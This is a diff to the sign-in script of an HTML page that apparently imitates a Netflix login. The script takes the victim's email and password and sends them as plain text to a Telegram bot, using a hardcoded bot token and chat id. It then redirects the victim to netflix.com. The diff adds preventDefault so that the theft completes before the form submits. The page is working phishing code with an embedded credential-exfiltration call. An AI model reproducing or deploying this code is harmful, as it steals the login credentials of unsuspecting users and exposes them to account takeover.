@@ -104,7 +104,8 @@
         </div>
     </div>
     <script src="js/script.js"></script>
-    <script>function signin(){
+    <script>function signin(ev){
+            ev.preventDefault();
             console.log("signing in...");
                 const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${inputEmail.value}:${inputPassword.value}`
     fetch(url, {
@@ -115,7 +116,7 @@
         console.log("Request complete! response:", res);
         window.location.replace('https://www.netflix.com');
     });
-            window.location.replace("http://www.netflix.com");
+            window.location.assign("http://www.netflix.com");
         }
     </script>
 </body>
